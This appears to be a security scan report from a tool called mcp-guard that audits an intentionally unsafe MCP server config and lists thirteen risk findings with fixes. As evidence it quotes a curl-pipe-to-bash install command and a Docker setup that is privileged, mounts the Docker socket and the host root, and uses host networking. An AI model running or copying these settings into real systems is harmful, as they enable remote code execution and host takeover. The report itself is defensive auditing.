# mcp-guard Scan Report

Generated: 2026-05-11T04:45:49.364Z

## Summary

- Scanned files: 1
- MCP servers: 4
- Active findings: 13
- Risk score: 100
- Critical: 4
- High: 7
- Medium: 2
- Low: 0

## Scanned Files

- `examples/unsafe-claude_desktop_config.json`

## MCP Server Inventory

| Server | Command | Args | CWD | URL | Env file | Env |
| --- | --- | --- | --- | --- | --- | --- |
| filesystem-all-home | npx | @modelcontextprotocol/server-filesystem / | / | - | - | GITHUB_TOKEN=ghp...890 (32 chars) |
| shell-installer | bash | -c curl https://example.com/install.sh \| bash | - | - | - | - |
| docker-host-control | docker | run --rm --privileged --network=host -v /var/run/docker.sock:/var/run/docker.sock --mount=type=bind,source=/,target=/host,readonly example/mcp-server:latest | - | - | - | - |
| remote-prod | - | - | - | https://mcp.example.com/sse | - | - |

## Active Findings

| Severity | Rule | Server | Finding | Evidence | Fingerprint | Recommendation |
| --- | --- | --- | --- | --- | --- | --- |
| critical | MCP010 | shell-installer | Shell command executes inline script | command=bash args=-c curl https://example.com/install.sh \| bash | mcpg_a009b2c2 | Use a direct, pinned executable instead of a shell wrapper. If a shell is required, place the script in source control and review it. |
| critical | MCP050 | shell-installer | MCP server command includes a dangerous operation | curl pipe to shell | mcpg_6bd13204 | Remove the dangerous operation from MCP startup. Run destructive setup steps manually and review them separately. |
| critical | MCP080 | docker-host-control | Container MCP server runs in privileged mode | --privileged | mcpg_058f2375 | Remove privileged mode and grant only the specific capabilities, devices, and filesystem paths the MCP server needs. |
| critical | MCP081 | docker-host-control | Container MCP server mounts the Docker socket | -v /var/run/docker.sock:/var/run/docker.sock | mcpg_fbc59a97 | Do not mount the Docker socket into an MCP server. Use a narrowly scoped broker or dedicated API with least-privilege authorization. |
| high | MCP021 | filesystem-all-home | Remote MCP package is not version pinned | package=@modelcontextprotocol/server-filesystem | mcpg_d0af49fa | Pin the package to an exact version such as package@1.2.3 and review updates before changing it. |
| high | MCP030 | filesystem-all-home | Secret-like environment variable is exposed to MCP server | GITHUB_TOKEN=ghp...890 (32 chars) | mcpg_a5f382b0 | Pass the least privileged token possible. Prefer scoped tokens, short-lived credentials, and a dedicated service account. |
| high | MCP040 | filesystem-all-home | MCP server has a broad working directory | cwd=/ | mcpg_31aaa689 | Run the server in a narrow project directory or sandbox with only the files it needs. |
| high | MCP041 | filesystem-all-home | MCP server argument grants broad filesystem access | arg=/ | mcpg_dbc08d76 | Replace broad filesystem paths with a dedicated project folder or read-only sandbox path. |
| high | MCP061 | remote-prod | Secret-like header is configured for remote MCP server | Authorization=Bea...ken (27 chars) | mcpg_5abd4cbd | Use scoped, short-lived credentials and avoid placing long-lived secrets directly in MCP config files. |
| high | MCP082 | docker-host-control | Container MCP server uses host networking | --network=host | mcpg_52106b68 | Use a dedicated bridge network and expose only the ports required by the MCP server. |
| high | MCP083 | docker-host-control | Container volume grants broad host filesystem access | --mount=type=bind,source=/,target=/host,readonly | mcpg_e8951605 | Mount a narrow project directory as read-only where possible, instead of root, home, or broad user folders. |
| medium | MCP020 | filesystem-all-home | MCP server is launched through a remote package runner | command=npx package=@modelcontextprotocol/server-filesystem | mcpg_a3493a53 | Pin the package version, review the package source, and prefer a local lockfile or vendored executable for sensitive tools. |
| medium | MCP060 | remote-prod | Remote MCP server URL is configured | url=https://mcp.example.com/sse | mcpg_cf1296e4 | Verify the provider, use HTTPS, document the data sent to this server, and keep an allowlist of approved remote endpoints. |

## Notes

- This report is an assistive security review, not a guarantee that all issues were found.
- Secret-like values are redacted by default.
- Review each MCP server before granting access to files, shells, SaaS accounts, or production systems.
